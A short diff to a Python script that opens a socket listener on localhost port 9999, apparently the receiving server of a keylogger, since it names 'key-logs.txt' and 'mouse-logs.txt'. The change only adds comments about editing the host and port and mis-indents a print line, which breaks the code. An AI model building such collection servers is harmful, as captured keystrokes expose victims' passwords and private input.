@@ -4,10 +4,10 @@ import sys
 files = ['key-logs.txt', 'mouse-logs.txt']
 
 s = socket.socket()
-s.bind(("localhost",9999))
+s.bind(("localhost",9999))  # edit hostname and port here
 s.listen(10)
 
-print('listening on port: 9999')
+    print('listening on port: 9999')    # edit port here
 while True:
     sc, address = s.accept()
 
